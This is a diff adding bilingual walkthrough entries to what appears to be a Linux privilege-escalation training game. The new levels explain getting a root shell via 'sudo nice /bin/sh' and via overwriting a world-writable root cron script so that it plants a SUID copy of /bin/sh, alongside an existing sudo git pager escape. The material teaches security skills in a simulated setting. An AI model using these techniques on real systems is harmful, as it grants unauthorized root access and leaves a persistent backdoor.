@@ -350,5 +350,27 @@ window.WALKTHROUGHS = {
         { cmd: 'sudo git -p help !/bin/sh', explain: {
             en: '-p forces the output through a pager (usually less), spawned as a child process of git. That pager has its own shell-escape builtin — and since git itself is root under sudo, the pager it spawns is root too.',
             fr: '-p force la sortie à passer par un pager (généralement less), lancé comme processus enfant de git. Ce pager a son propre échappement shell intégré — et comme git lui-même est root sous sudo, le pager qu\'il lance l\'est aussi.' } }
+    ],
+    34: [ // sudo nice passthrough
+        { cmd: 'sudo -l', explain: {
+            en: 'Only nice is allowed — a scheduling-priority tool. It just decides how much CPU a program gets... or so it seems.',
+            fr: "Seul nice est autorisé — un outil de priorité d'ordonnancement. Il ne fait que décider combien de CPU un programme reçoit... du moins en apparence." } },
+        { cmd: 'sudo nice /bin/sh', explain: {
+            en: "nice's entire job is to launch whatever command follows it, just at an adjusted priority — it never inspects that command. It runs /bin/sh as instructed, and since nice itself is root under sudo, so is the shell.",
+            fr: "Le seul rôle de nice est de lancer la commande qui suit, avec une priorité ajustée — il ne l'inspecte jamais. Il lance /bin/sh comme demandé, et comme nice lui-même est root sous sudo, le shell l'est aussi." } }
+    ],
+    35: [ // cron writable monitoring script
+        { cmd: 'cat /etc/crontab', explain: {
+            en: 'System-wide cron jobs run as whatever user is listed on their line — here root runs /opt/monitor/healthcheck.sh every minute.',
+            fr: 'Les tâches cron système s\'exécutent avec l\'utilisateur indiqué sur leur ligne — ici root lance /opt/monitor/healthcheck.sh toutes les minutes.' } },
+        { cmd: 'ls -la /opt/monitor/healthcheck.sh', explain: {
+            en: 'Mode 777: the monitoring script root executes is writable by literally anyone. It looks lower-stakes than a backup job, but it runs with the exact same root privilege.',
+            fr: "Mode 777 : le script de surveillance exécuté par root est modifiable par n'importe qui. Il paraît moins sensible qu'un job de sauvegarde, mais il tourne avec exactement le même privilège root." } },
+        { cmd: 'echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/monitor/healthcheck.sh', explain: {
+            en: 'Replace the payload: next time cron fires it as root, it drops a copy of /bin/sh with the SUID bit set.',
+            fr: 'On remplace le payload : à la prochaine exécution par cron en root, il dépose une copie de /bin/sh avec le bit SUID posé.' } },
+        { cmd: 'wait', explain: {
+            en: 'Let the simulated cron tick pass. Once it fires, /tmp/rootsh exists and running it gives a root shell.',
+            fr: 'On laisse passer le tic cron simulé. Une fois déclenché, /tmp/rootsh existe et le lancer donne un shell root.' } }
     ]
 };
